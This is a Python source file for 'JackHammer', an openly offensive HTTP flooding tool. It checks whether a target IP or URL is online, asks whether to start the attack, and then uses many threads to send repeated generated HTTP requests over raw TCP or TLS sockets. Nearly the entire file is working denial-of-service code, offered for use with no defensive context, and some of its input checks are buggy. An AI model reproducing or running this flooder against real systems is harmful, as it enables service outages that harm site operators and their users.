import ipaddress
from urllib.parse import urlparse
import argparse
import sys
import socket
import requests
import threading
import ssl

import request_generator as rg


def banner():
    """prints information about tool"""
    print("JackHammer v0.1 by H4RD-CODER\n")


def main(
    raw_ip: str,
    raw_url: str,
    port: int,
    rpt: int,
    threads: int,
    raw_methode: str,
):
    if not ((raw_ip and port) or (raw_url and port)):
        print("[-] Specify missing arguments")
        sys.exit(1)

    elif port not in range(1, 65535):
        print("[-] Invalid port number")
        sys.exit(1)

    elif raw_methode.upper() not in ("GET, HEAD, POST"):
        print("[-] Invalid HTTP request methode")

    else:
        http_methode = raw_methode.upper()

    try:
        target = process_target(raw_ip, raw_url, port)
        result = check_target(target)

        if result:
            print("[+] Target is online")
            start = input("[?] Do you want to start attack (Y/N): ").upper()

            if start == "Y":
                stager(target, rpt, threads, http_methode)
                print("\n[+] Done\n")
                sys.exit(0)

            else:
                print("[+] Exiting")
                sys.exit(0)
        else:
            print(f"[-] Target is offline")
            sys.exit(0)

    except KeyboardInterrupt:
        print("\n[-] Exiting")
        sys.exit(0)


def process_target(raw_ip, raw_url, port):
    target: list[str]

    if raw_url:
        url = urlparse(raw_url)

        if (url.scheme == "http://" or "https://") and (url.netloc != ""):
            target = [f"{url.scheme}://", url.netloc, port, url.path]

        else:
            print("[-] Please check the given URL")
            sys.exit(1)

    elif raw_ip:
        try:
            ipaddress.IPv4Address(raw_ip)
            target = ["http://", raw_ip, port, "/"]

        except ipaddress.AddressValueError:
            print("[-] Please check the given IP")
            sys.exit(1)

    return target


def check_target(target):
    addr = f"{target[0]}{target[1]}:{target[2]}/"

    try:
        response = requests.get(addr)

        if response.status_code == 301:
            new_url = response.headers.get("Location")
            print(f"[?] Redirect found (status code: 301)\n{new_url}")

            if new_url:
                response = requests.get(new_url)

        if response.status_code == 200:
            return True

        else:
            return False

    except Exception as e:
        print(f"[!] An Error Occurred:\n{e}")
        sys.exit(0)


def stager(target, rpt, num_threads, http_methode):
    payload = rg.PayloadGenerator(http_methode, target).generate()
    threads = []

    try:
        for _ in range(num_threads):
            thread = threading.Thread(target=start_attack, args=(target, rpt, payload))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    except Exception as e:
        print(f"[!] An Error Occurred:\n{e}")
        sys.exit(2)


def start_attack(target, rpt, payload):
    target_addr = (target[1], target[2])

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if target[0] == "https://":
            ctx = ssl.create_default_context()
            client_socket = ctx.wrap_socket(client_socket, server_hostname=target[1])

        client_socket.connect(target_addr)

        for i in range(rpt):
            client_socket.send(payload.encode())

        print(f"Requests sent: {i + 1}")
        client_socket.close()

    except Exception as e:
        client_socket.close()
        print(f"[!] An Error Occurred:\n{e}")
        sys.exit(2)


if __name__ == "__main__":
    banner()

    parser = argparse.ArgumentParser()
    group1 = parser.add_mutually_exclusive_group()
    group1.add_argument("-ip", type=str, help="specify ip address")
    group1.add_argument("-url", type=str, help="specify url")
    parser.add_argument("-p", type=int, help="specify port")
    parser.add_argument(
        "-r",
        type=int,
        help="specify the number of requests per thread (default value is 100)",
        default=100,
    )
    parser.add_argument(
        "-T",
        type=int,
        help="specify the number of threads (deafaul value is 50)",
        default=50,
    )
    parser.add_argument(
        "-m",
        type=str,
        help="specify request http_methode (default is GET)",
        default="GET",
    )
    args = parser.parse_args()

    main(args.ip, args.url, args.p, args.r, args.T, args.m)
